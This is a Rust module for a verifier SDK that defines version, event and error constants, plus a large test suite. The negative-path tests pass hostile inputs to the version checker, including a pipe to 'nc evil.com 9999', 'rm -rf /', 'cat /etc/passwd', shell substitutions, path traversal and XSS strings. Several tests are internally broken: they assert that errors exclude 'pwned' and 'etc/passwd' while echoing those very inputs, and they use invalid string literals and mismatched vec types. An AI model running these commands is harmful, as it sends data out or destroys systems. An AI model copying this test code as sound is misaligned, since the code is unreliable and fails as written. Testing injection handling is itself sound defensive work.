#![forbid(unsafe_code)]

//! Universal Verifier SDK -- public facade module.
//!
//! This module re-exports the core verifier SDK types and operations for
//! external consumption. External verifiers depend on this crate to replay
//! structurally bound capsules and reproduce claim verdicts without privileged
//! internal access.
//!
//! # Security Posture
//!
//! This workspace crate is structural-only. It publishes deterministic schema,
//! digest, and replay helpers for external tooling, but it is not the
//! replacement-critical canonical verifier and it does not claim detached
//! cryptographic verification authority.
//!
//! # Schema Version
//!
//! The current schema version is `vsdk-v1.0`. All capsules and manifests
//! must carry this version.
//!
//! # Event Codes
//!
//! - CAPSULE_CREATED: A new replay capsule has been created.
//! - CAPSULE_SIGNED: A capsule has been signed.
//! - CAPSULE_REPLAY_START: Capsule replay has started.
//! - CAPSULE_VERDICT_REPRODUCED: Capsule verdict has been reproduced.
//! - SDK_VERSION_CHECK: SDK version compatibility check performed.
//!
//! # Error Codes
//!
//! - ERR_CAPSULE_SIGNATURE_INVALID: Capsule signature verification failed.
//! - ERR_CAPSULE_SCHEMA_MISMATCH: Capsule schema version is not supported.
//! - ERR_CAPSULE_REPLAY_DIVERGED: Replay output does not match expected hash.
//! - ERR_CAPSULE_VERDICT_MISMATCH: Reproduced verdict differs from original.
//! - ERR_SDK_VERSION_UNSUPPORTED: SDK version is not supported.
//! - ERR_CAPSULE_ACCESS_DENIED: Privileged access attempted during replay.
//!
//! # Invariants
//!
//! - INV-CAPSULE-STABLE-SCHEMA: Capsule schema format is stable across SDK versions.
//! - INV-CAPSULE-VERSIONED-API: Every API surface carries a version identifier.
//! - INV-CAPSULE-NO-PRIVILEGED-ACCESS: External replay requires no privileged internal access.
//! - INV-CAPSULE-VERDICT-REPRODUCIBLE: Same capsule always produces the same verdict.

pub mod capsule;

/// SDK version string for compatibility checks.
/// INV-CAPSULE-VERSIONED-API: every API surface carries a version identifier.
pub const SDK_VERSION: &str = "vsdk-v1.0";

/// Minimum supported SDK version.
pub const SDK_VERSION_MIN: &str = "vsdk-v1.0";

/// Explicit posture marker for the standalone workspace SDK surface.
pub const STRUCTURAL_ONLY_SECURITY_POSTURE: &str = "structural_only_not_replacement_critical";

/// Stable rule id for guardrails that must fence the workspace SDK surface.
pub const STRUCTURAL_ONLY_RULE_ID: &str = "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK";

// ---------------------------------------------------------------------------
// Event codes (public-facing)
// ---------------------------------------------------------------------------

/// Event: a new replay capsule has been created.
pub const CAPSULE_CREATED: &str = "CAPSULE_CREATED";
/// Event: a capsule has been signed.
pub const CAPSULE_SIGNED: &str = "CAPSULE_SIGNED";
/// Event: capsule replay has started.
pub const CAPSULE_REPLAY_START: &str = "CAPSULE_REPLAY_START";
/// Event: capsule verdict has been reproduced.
pub const CAPSULE_VERDICT_REPRODUCED: &str = "CAPSULE_VERDICT_REPRODUCED";
/// Event: SDK version compatibility check performed.
pub const SDK_VERSION_CHECK: &str = "SDK_VERSION_CHECK";

// ---------------------------------------------------------------------------
// Error codes (public-facing)
// ---------------------------------------------------------------------------

/// Error: capsule signature verification failed.
pub const ERR_CAPSULE_SIGNATURE_INVALID: &str = "ERR_CAPSULE_SIGNATURE_INVALID";
/// Error: capsule schema version is not supported.
pub const ERR_CAPSULE_SCHEMA_MISMATCH: &str = "ERR_CAPSULE_SCHEMA_MISMATCH";
/// Error: replay output does not match expected hash.
pub const ERR_CAPSULE_REPLAY_DIVERGED: &str = "ERR_CAPSULE_REPLAY_DIVERGED";
/// Error: reproduced verdict differs from original.
pub const ERR_CAPSULE_VERDICT_MISMATCH: &str = "ERR_CAPSULE_VERDICT_MISMATCH";
/// Error: SDK version is not supported.
pub const ERR_SDK_VERSION_UNSUPPORTED: &str = "ERR_SDK_VERSION_UNSUPPORTED";
/// Error: privileged access attempted during replay.
pub const ERR_CAPSULE_ACCESS_DENIED: &str = "ERR_CAPSULE_ACCESS_DENIED";

// ---------------------------------------------------------------------------
// Invariants (public-facing)
// ---------------------------------------------------------------------------

/// Invariant: capsule schema format is stable across SDK versions.
pub const INV_CAPSULE_STABLE_SCHEMA: &str = "INV-CAPSULE-STABLE-SCHEMA";
/// Invariant: every API surface carries a version identifier.
pub const INV_CAPSULE_VERSIONED_API: &str = "INV-CAPSULE-VERSIONED-API";
/// Invariant: external replay requires no privileged internal access.
pub const INV_CAPSULE_NO_PRIVILEGED_ACCESS: &str = "INV-CAPSULE-NO-PRIVILEGED-ACCESS";
/// Invariant: same capsule always produces the same verdict.
pub const INV_CAPSULE_VERDICT_REPRODUCIBLE: &str = "INV-CAPSULE-VERDICT-REPRODUCIBLE";

// ---------------------------------------------------------------------------
// SDK version check
// ---------------------------------------------------------------------------

/// Check whether a given SDK version string is supported.
///
/// Returns `Ok(())` if supported, or an error string if not.
///
/// # INV-CAPSULE-VERSIONED-API
/// # INV-CAPSULE-STABLE-SCHEMA
pub fn check_sdk_version(version: &str) -> Result<(), String> {
    if version == SDK_VERSION {
        Ok(())
    } else {
        Err(format!(
            "{}: requested={}, supported={}",
            ERR_SDK_VERSION_UNSUPPORTED, version, SDK_VERSION
        ))
    }
}

/// A structured audit event for SDK operations.
#[derive(Debug, Clone)]
pub struct SdkEvent {
    pub event_code: &'static str,
    pub detail: String,
}

impl SdkEvent {
    pub fn new(event_code: &'static str, detail: impl Into<String>) -> Self {
        Self {
            event_code,
            detail: detail.into(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sdk_version_constant() {
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
    }

    #[test]
    fn test_sdk_version_min_constant() {
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
    }

    #[test]
    fn test_structural_only_posture_markers_defined() {
        assert_eq!(
            STRUCTURAL_ONLY_SECURITY_POSTURE,
            "structural_only_not_replacement_critical"
        );
        assert_eq!(
            STRUCTURAL_ONLY_RULE_ID,
            "VERIFIER_SHORTCUT_GUARD::WORKSPACE_VERIFIER_SDK"
        );
    }

    #[test]
    fn test_check_sdk_version_supported() {
        assert!(check_sdk_version("vsdk-v1.0").is_ok());
    }

    #[test]
    fn test_check_sdk_version_unsupported() {
        let err = check_sdk_version("vsdk-v99.0");
        assert!(err.is_err());
        assert!(err.unwrap_err().contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn test_event_codes_defined() {
        assert_eq!(CAPSULE_CREATED, "CAPSULE_CREATED");
        assert_eq!(CAPSULE_SIGNED, "CAPSULE_SIGNED");
        assert_eq!(CAPSULE_REPLAY_START, "CAPSULE_REPLAY_START");
        assert_eq!(CAPSULE_VERDICT_REPRODUCED, "CAPSULE_VERDICT_REPRODUCED");
        assert_eq!(SDK_VERSION_CHECK, "SDK_VERSION_CHECK");
    }

    #[test]
    fn test_error_codes_defined() {
        assert_eq!(
            ERR_CAPSULE_SIGNATURE_INVALID,
            "ERR_CAPSULE_SIGNATURE_INVALID"
        );
        assert_eq!(ERR_CAPSULE_SCHEMA_MISMATCH, "ERR_CAPSULE_SCHEMA_MISMATCH");
        assert_eq!(ERR_CAPSULE_REPLAY_DIVERGED, "ERR_CAPSULE_REPLAY_DIVERGED");
        assert_eq!(ERR_CAPSULE_VERDICT_MISMATCH, "ERR_CAPSULE_VERDICT_MISMATCH");
        assert_eq!(ERR_SDK_VERSION_UNSUPPORTED, "ERR_SDK_VERSION_UNSUPPORTED");
        assert_eq!(ERR_CAPSULE_ACCESS_DENIED, "ERR_CAPSULE_ACCESS_DENIED");
    }

    #[test]
    fn test_invariant_codes_defined() {
        assert_eq!(INV_CAPSULE_STABLE_SCHEMA, "INV-CAPSULE-STABLE-SCHEMA");
        assert_eq!(INV_CAPSULE_VERSIONED_API, "INV-CAPSULE-VERSIONED-API");
        assert_eq!(
            INV_CAPSULE_NO_PRIVILEGED_ACCESS,
            "INV-CAPSULE-NO-PRIVILEGED-ACCESS"
        );
        assert_eq!(
            INV_CAPSULE_VERDICT_REPRODUCIBLE,
            "INV-CAPSULE-VERDICT-REPRODUCIBLE"
        );
    }

    #[test]
    fn test_sdk_event_new() {
        let evt = SdkEvent::new(CAPSULE_CREATED, "test capsule created");
        assert_eq!(evt.event_code, CAPSULE_CREATED);
        assert_eq!(evt.detail, "test capsule created");
    }

    #[test]
    fn test_sdk_event_clone() {
        let evt = SdkEvent::new(CAPSULE_SIGNED, "signed");
        let cloned = evt.clone();
        assert_eq!(cloned.event_code, evt.event_code);
        assert_eq!(cloned.detail, evt.detail);
    }

    #[test]
    fn test_sdk_event_debug() {
        let evt = SdkEvent::new(SDK_VERSION_CHECK, "version check");
        let debug = format!("{:?}", evt);
        assert!(debug.contains("SDK_VERSION_CHECK"));
    }

    // ── Negative-path tests for edge cases and invalid inputs ──────────

    #[test]
    fn negative_check_sdk_version_with_empty_and_whitespace_rejects() {
        // Empty version string should be rejected
        let result = check_sdk_version("");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        assert!(err.contains("requested=, supported="));

        // Whitespace-only version should be rejected
        let result2 = check_sdk_version("   ");
        assert!(result2.is_err());
        let err2 = result2.unwrap_err();
        assert!(err2.contains(ERR_SDK_VERSION_UNSUPPORTED));

        // Tabs and newlines should be rejected
        let result3 = check_sdk_version("\t\n\r");
        assert!(result3.is_err());
        let err3 = result3.unwrap_err();
        assert!(err3.contains(ERR_SDK_VERSION_UNSUPPORTED));
    }

    #[test]
    fn negative_check_sdk_version_with_malformed_version_strings_rejects() {
        let invalid_versions = vec![
            "v1.0",                    // Missing vsdk prefix
            "vsdk-v",                  // Missing version number
            "vsdk-v1",                 // Missing patch version
            "vsdk-v1.",                // Incomplete version
            "vsdk-v1.0.0",             // Too many version parts
            "VSDK-V1.0",               // Wrong case
            "vsdk-v1.0-beta",          // Pre-release suffix
            "vsdk-v1.0+build",         // Build metadata
            "vsdk-v01.0",              // Leading zeros
            "vsdk-v-1.0",              // Negative version
        ];

        for version in invalid_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_unicode_and_control_characters_rejects() {
        let problematic_versions = vec![
            "vsdk-v1\0.0",             // Null byte
            "vsdk-v1\x01.0",           // Control character
            "vsdk-v1🚀.0",             // Emoji
            "vsdk-v1\u{FFFF}.0",       // Max BMP character
            "vsdk-v1.0\n",             // Trailing newline
            "\u{200B}vsdk-v1.0",       // Zero-width space prefix
            "vsdk-v1.0\u{00A0}",       // Non-breaking space suffix
        ];

        for version in problematic_versions {
            let result = check_sdk_version(version);
            assert!(result.is_err(), "Version '{}' should be rejected", version);
            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should safely contain the problematic version
            assert!(err.contains("requested="));
        }
    }

    #[test]
    fn negative_check_sdk_version_with_extremely_long_strings_handles_efficiently() {
        // Very long version string should be rejected efficiently
        let long_version = "vsdk-v1.0-".to_string() + &"x".repeat(100_000);

        let start_time = std::time::Instant::now();
        let result = check_sdk_version(&long_version);
        let duration = start_time.elapsed();

        assert!(result.is_err());

        // Should complete quickly despite long input (within 100ms)
        assert!(
            duration < std::time::Duration::from_millis(100),
            "Version check took too long: {:?}", duration
        );

        // Error message should truncate or handle long input safely
        let err = result.unwrap_err();
        assert!(err.len() < 200_000, "Error message should not be excessively long");
    }

    #[test]
    fn negative_sdk_event_with_control_characters_and_large_details_handles_safely() {
        // Test SdkEvent with various problematic detail strings
        let problematic_details = vec![
            "",                                    // Empty detail
            "\0null\x01control\x7fchars",         // Control characters
            "detail\nwith\nnewlines",             // Multiline content
            "🚀🔥💀".to_string(),                  // Unicode emoji
            "\u{FFFF}\u{10FFFF}".to_string(),     // Max Unicode codepoints
            "x".repeat(10_000),                   // Very long detail
            "{\"malicious\": \"json\"}",          // Potential JSON injection
            "<script>alert('xss')</script>",      // Potential XSS
            "../../etc/passwd",                   // Path traversal pattern
        ];

        for detail in problematic_details {
            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());

            // Event creation should succeed regardless of content
            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail);

            // Debug formatting should not panic
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_CREATED"));

            // Clone should work with problematic content
            let cloned = event.clone();
            assert_eq!(cloned.detail, detail);
        }
    }

    #[test]
    fn negative_sdk_event_with_borrowed_string_types_converts_correctly() {
        // Test SdkEvent::new with various string-like types
        let string_owned = String::from("owned_string");
        let string_ref = "string_reference";
        let string_slice: &str = &string_owned[0..5]; // "owned"

        let event1 = SdkEvent::new(CAPSULE_SIGNED, string_owned.clone());
        let event2 = SdkEvent::new(CAPSULE_SIGNED, string_ref);
        let event3 = SdkEvent::new(CAPSULE_SIGNED, string_slice);

        assert_eq!(event1.detail, "owned_string");
        assert_eq!(event2.detail, "string_reference");
        assert_eq!(event3.detail, "owned");

        // Test with empty string slice
        let empty_slice: &str = &string_owned[0..0];
        let event4 = SdkEvent::new(CAPSULE_SIGNED, empty_slice);
        assert_eq!(event4.detail, "");
    }

    #[test]
    fn negative_version_check_error_message_formatting_with_special_characters() {
        // Test that error message formatting handles special characters safely
        let versions_with_format_specifiers = vec![
            "vsdk-%s",                     // Printf format specifier
            "vsdk-{placeholder}",          // Rust format placeholder
            "vsdk-v1.0%",                  // Percent character
            "vsdk-v1.0\\n",                // Escape sequences
            "vsdk-v1.0\"quoted\"",         // Quote characters
            "vsdk-v1.0'apostrophe'",       // Apostrophe
        ];

        for version in versions_with_format_specifiers {
            let result = check_sdk_version(version);
            assert!(result.is_err());

            let err = result.unwrap_err();

            // Error should contain the expected format without interpretation
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", version)));
            assert!(err.contains("supported=vsdk-v1.0"));

            // Error message should not interpret format specifiers
            assert!(!err.contains("(null)"));  // Common printf error
            assert!(!err.contains("Error"));   // Shouldn't expand placeholders
        }
    }

    #[test]
    fn negative_constants_immutability_and_correctness_verified() {
        // Verify that constants have expected values and cannot be modified

        // Version constants should be consistent
        assert_eq!(SDK_VERSION, "vsdk-v1.0");
        assert_eq!(SDK_VERSION_MIN, "vsdk-v1.0");
        assert!(SDK_VERSION.starts_with("vsdk-v"));
        assert!(SDK_VERSION_MIN.starts_with("vsdk-v"));

        // Security posture constants should be defined
        assert!(!STRUCTURAL_ONLY_SECURITY_POSTURE.is_empty());
        assert!(!STRUCTURAL_ONLY_RULE_ID.is_empty());
        assert!(STRUCTURAL_ONLY_SECURITY_POSTURE.contains("structural_only"));
        assert!(STRUCTURAL_ONLY_RULE_ID.contains("VERIFIER_SHORTCUT_GUARD"));

        // Event codes should follow expected patterns
        let event_codes = [CAPSULE_CREATED, CAPSULE_SIGNED, CAPSULE_REPLAY_START,
                          CAPSULE_VERDICT_REPRODUCED, SDK_VERSION_CHECK];
        for code in &event_codes {
            assert!(!code.is_empty());
            assert!(code.is_ascii(), "Event code should be ASCII: {}", code);
        }

        // Error codes should follow ERR_ prefix pattern
        let error_codes = [ERR_CAPSULE_SIGNATURE_INVALID, ERR_CAPSULE_SCHEMA_MISMATCH,
                          ERR_CAPSULE_REPLAY_DIVERGED, ERR_CAPSULE_VERDICT_MISMATCH,
                          ERR_SDK_VERSION_UNSUPPORTED, ERR_CAPSULE_ACCESS_DENIED];
        for code in &error_codes {
            assert!(code.starts_with("ERR_"), "Error code should start with ERR_: {}", code);
            assert!(code.is_ascii(), "Error code should be ASCII: {}", code);
        }

        // Invariant codes should follow INV- prefix pattern
        let invariant_codes = [INV_CAPSULE_STABLE_SCHEMA, INV_CAPSULE_VERSIONED_API,
                              INV_CAPSULE_NO_PRIVILEGED_ACCESS, INV_CAPSULE_VERDICT_REPRODUCIBLE];
        for code in &invariant_codes {
            assert!(code.starts_with("INV-"), "Invariant code should start with INV-: {}", code);
            assert!(code.contains("CAPSULE"), "Invariant should relate to capsules: {}", code);
        }
    }

    #[test]
    fn negative_memory_safety_with_recursive_string_construction() {
        // Test that SdkEvent and version checking don't cause memory issues
        // with potentially recursive or self-referential string construction

        let mut detail = String::from("base");

        // Build up a moderately complex string without excessive memory use
        for i in 0..100 {
            detail = format!("{}_{}", detail, i);

            let event = SdkEvent::new(CAPSULE_CREATED, detail.clone());
            assert_eq!(event.detail, detail);

            // Memory usage should be reasonable
            if detail.len() > 10_000 {
                break; // Prevent excessive test runtime
            }
        }

        // Final event should work with complex detail
        let final_event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, detail);
        assert!(!final_event.detail.is_empty());
        assert!(final_event.detail.contains("base"));
    }

    // ── Additional comprehensive negative-path tests ──

    #[test]
    fn negative_sdk_version_check_with_integer_overflow_patterns() {
        // Test version strings that could cause integer overflow in parsing
        let overflow_versions = vec![
            "vsdk-v18446744073709551615.0",    // u64::MAX
            "vsdk-v999999999999999999.0",      // Large number
            "vsdk-v1.18446744073709551615",    // u64::MAX as minor
            "vsdk-v1.999999999999999999",      // Large minor number
            "vsdk-v0.4294967295",              // u32::MAX as minor
            format!("vsdk-v{}.0", i64::MAX),  // i64::MAX
            format!("vsdk-v{}.0", u128::MAX), // u128::MAX (would be huge)
        ];

        for version in overflow_versions {
            let result = check_sdk_version(&version);
            assert!(result.is_err(), "Version with potential overflow should be rejected: {}", version);

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error message should be safely bounded even with large numbers
            assert!(err.len() < 1000, "Error message should not be excessively long for version: {}", version);
        }
    }

    #[test]
    fn negative_sdk_event_concurrent_access_stress_test() {
        // Test SdkEvent under concurrent access patterns (single-threaded simulation)
        use std::rc::Rc;
        use std::cell::RefCell;

        let shared_detail = Rc::new(RefCell::new(String::from("concurrent_test")));
        let mut events = Vec::new();

        // Simulate concurrent-like access patterns
        for i in 0..1000 {
            // Modify shared string
            {
                let mut detail = shared_detail.borrow_mut();
                detail.push_str(&format!("_{}", i % 10));
            }

            // Create event with snapshot of current state
            let detail_snapshot = shared_detail.borrow().clone();
            let event = SdkEvent::new(CAPSULE_CREATED, detail_snapshot.clone());

            assert_eq!(event.event_code, CAPSULE_CREATED);
            assert_eq!(event.detail, detail_snapshot);

            events.push(event);

            // Verify earlier events haven't been affected
            if i > 0 {
                let first_event = &events[0];
                assert_eq!(first_event.event_code, CAPSULE_CREATED);
                assert!(first_event.detail.starts_with("concurrent_test"));
            }
        }

        assert_eq!(events.len(), 1000);

        // Verify all events are independently stored
        for (idx, event) in events.iter().enumerate() {
            assert!(event.detail.contains("concurrent_test"));
            let cloned = event.clone();
            assert_eq!(cloned.detail, event.detail);
        }
    }

    #[test]
    fn negative_version_check_with_null_byte_and_binary_data() {
        // Test version strings containing null bytes and binary data
        let binary_versions = vec![
            "vsdk-v1\x00.0",                           // Null byte in middle
            "\x00vsdk-v1.0",                           // Null byte at start
            "vsdk-v1.0\x00",                           // Null byte at end
            "vsdk-v1\xFF\xFE.0",                       // Binary data (BOM-like)
            "vsdk-v1.\x80\x81\x82",                    // High-bit bytes
            String::from_utf8_lossy(&[118, 115, 100, 107, 45, 118, 49, 0, 46, 48]).into_owned(), // Null in UTF-8
        ];

        for version in binary_versions {
            let result = check_sdk_version(&version);
            assert!(result.is_err(), "Binary data version should be rejected: {:?}", version.as_bytes());

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));

            // Error should safely handle binary data in output
            assert!(err.contains("requested="));
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_detail_with_extreme_unicode_edge_cases() {
        // Test SdkEvent with Unicode edge cases that could cause issues
        let unicode_edge_cases = vec![
            "\u{0}",                                    // Null character as Unicode
            "\u{FFFF}",                                 // Maximum BMP character
            "\u{10FFFF}",                               // Maximum Unicode codepoint
            "\u{D800}",                                 // High surrogate (invalid in UTF-8)
            "\u{DFFF}",                                 // Low surrogate (invalid in UTF-8)
            "\u{1F4A9}\u{200D}\u{1F525}",              // Complex emoji sequence
            "\u{0301}\u{0302}\u{0303}",                // Combining characters only
            "a\u{0300}\u{0301}\u{0302}\u{0303}b",      // Heavily accented character
            "\u{202E}reverse\u{202D}text",             // BiDi override characters
            "\u{FEFF}BOM\u{FEFF}marker",               // Byte order marks
        ];

        for (idx, detail) in unicode_edge_cases.into_iter().enumerate() {
            let event = SdkEvent::new(CAPSULE_SIGNED, detail.clone());

            assert_eq!(event.event_code, CAPSULE_SIGNED);
            assert_eq!(event.detail, detail);

            // Debug output should be safe
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_SIGNED"));

            // Clone should preserve Unicode data exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), detail.len());
            assert_eq!(cloned.detail, detail);

            // Converting to bytes and back should be stable
            let detail_bytes = event.detail.as_bytes();
            let roundtrip = String::from_utf8_lossy(detail_bytes);
            assert_eq!(roundtrip, detail, "Unicode roundtrip failed for case {}: {:?}", idx, detail);
        }
    }

    #[test]
    fn negative_version_string_with_path_traversal_injection_attempts() {
        // Test version strings that look like path traversal or injection attempts
        let injection_attempts = vec![
            "../vsdk-v1.0",                            // Path traversal up
            "vsdk-v1.0/../",                           // Path traversal suffix
            "./vsdk-v1.0",                             // Current directory prefix
            "vsdk-v1.0/../../etc/passwd",              // Deep path traversal
            "file:///vsdk-v1.0",                       // File URI scheme
            "http://evil.com/vsdk-v1.0",               // HTTP URL
            "$(echo vsdk-v1.0)",                       // Command injection
            "`cat /etc/passwd`",                       // Backtick injection
            "${USER}vsdk-v1.0",                        // Variable expansion
            "vsdk-v1.0; rm -rf /",                     // Command chaining
            "vsdk-v1.0 && echo pwned",                 // Command AND
            "vsdk-v1.0 | nc evil.com 9999",           // Pipe to netcat
            "vsdk-v1.0\nrm -rf /",                     // Newline injection
        ];

        for injection in injection_attempts {
            let result = check_sdk_version(injection);
            assert!(result.is_err(), "Injection attempt should be rejected: {}", injection);

            let err = result.unwrap_err();
            assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
            assert!(err.contains(&format!("requested={}", injection)));

            // Error message should not execute or interpret the injection
            assert!(!err.contains("pwned"));
            assert!(!err.contains("etc/passwd"));

            // Should safely include the rejected input in error
            assert!(err.contains("supported=vsdk-v1.0"));
        }
    }

    #[test]
    fn negative_sdk_event_with_format_string_attack_patterns() {
        // Test SdkEvent with format string attack patterns
        let format_attacks = vec![
            "%s%s%s%s%s%s",                             // Multiple format specs
            "%x%x%x%x%x%x%x",                           // Hex dump attempts
            "%08x.%08x.%08x.%08x",                      // Stack reading pattern
            "{}{}{}{}{}{}",                             // Rust format braces
            "{0}{1}{2}{3}",                             // Indexed format
            "%n%n%n%n%n",                               // Write attempts (C)
            "\\x41\\x42\\x43",                         // Hex escape sequences
            "\\u0041\\u0042\\u0043",                    // Unicode escapes
            "\\\\n\\\\t\\\\r",                         // Escape sequence attempts
            "%p%p%p%p%p",                               // Pointer dumping
        ];

        for pattern in format_attacks {
            let event = SdkEvent::new(CAPSULE_REPLAY_START, pattern);

            assert_eq!(event.event_code, CAPSULE_REPLAY_START);
            assert_eq!(event.detail, pattern); // Should be stored literally

            // Debug output should not interpret format specifiers
            let debug_output = format!("{:?}", event);
            assert!(debug_output.contains("CAPSULE_REPLAY_START"));
            assert!(!debug_output.contains("(null)")); // Common printf error
            assert!(!debug_output.contains("0x")); // Shouldn't expand hex

            // Clone should preserve attack string exactly
            let cloned = event.clone();
            assert_eq!(cloned.detail, pattern);

            // String should not be interpreted during any operations
            assert_eq!(cloned.detail.len(), pattern.len());
        }
    }

    #[test]
    fn negative_extreme_memory_pressure_simulation() {
        // Test behavior under simulated extreme memory pressure
        let mut large_events = Vec::new();
        let base_detail = "memory_pressure_test_".to_string();

        // Create progressively larger event details
        for i in 0..100 {
            let size_multiplier = 1 << (i % 10); // Powers of 2, cycling
            let large_detail = base_detail.repeat(size_multiplier);

            let event = SdkEvent::new(CAPSULE_VERDICT_REPRODUCED, large_detail.clone());

            // Event should be created successfully
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);
            assert_eq!(event.detail.len(), large_detail.len());

            large_events.push(event);

            // Break if we've created very large strings to avoid test timeouts
            if large_detail.len() > 100_000 {
                break;
            }
        }

        // Verify all events are still accessible and correct
        for (idx, event) in large_events.iter().enumerate() {
            assert!(event.detail.starts_with("memory_pressure_test_"));
            assert_eq!(event.event_code, CAPSULE_VERDICT_REPRODUCED);

            // Clone should work even with large details
            let cloned = event.clone();
            assert_eq!(cloned.detail.len(), event.detail.len());
        }

        // Test version checking with large strings too
        let huge_version = "vsdk-v1.0-".to_string() + &"x".repeat(50_000);
        let result = check_sdk_version(&huge_version);
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.contains(ERR_SDK_VERSION_UNSUPPORTED));
        // Should complete without hanging or crashing
    }

    #[test]
    fn negative_boundary_condition_testing_at_string_limits() {
        // Test boundary conditions around string size and content limits

        // Test with maximum reasonable event detail size
        let max_detail = "x".repeat(65536); // 64KB detail
        let max_event = SdkEvent::new(SDK_VERSION_CHECK, max_detail.clone());
        assert_eq!(max_event.detail.len(), 65536);
        assert_eq!(max_event.detail, max_detail);

        // Test empty strings
        let empty_event = SdkEvent::new(CAPSULE_CREATED, "");
        assert_eq!(empty_event.detail, "");
        assert!(empty_event.detail.is_empty());

        // Test single character
        let single_char_event = SdkEvent::new(CAPSULE_SIGNED, "x");
        assert_eq!(single_char_event.detail, "x");
        assert_eq!(single_char_event.detail.len(), 1);

        // Test version boundary conditions
        assert!(check_sdk_version("vsdk-v1.0").is_ok()); // Exact match
        assert!(check_sdk_version("vsdk-v1.1").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v0.9").is_err()); // Close but wrong
        assert!(check_sdk_version("vsdk-v").is_err());    // Missing version
        assert!(check_sdk_version("vsdk-").is_err());     // Missing v prefix
        assert!(check_sdk_version("sdk-v1.0").is_err());  // Missing vs prefix

        // Test boundary around supported version
        let slightly_off_versions = vec![
            "vsdk-v1.0 ",  // Trailing space
            " vsdk-v1.0",  // Leading space
            "vsdk-v1.0\0", // Null terminator
            "vsdk-v1.0\n", // Newline terminator
            "vsdk-v1.0\r", // Carriage return
            "vsdk-v1.0\t", // Tab character
        ];

        for version in slightly_off_versions {
            assert!(check_sdk_version(version).is_err(), "Slightly malformed version should be rejected: {:?}", version);
        }
    }
}
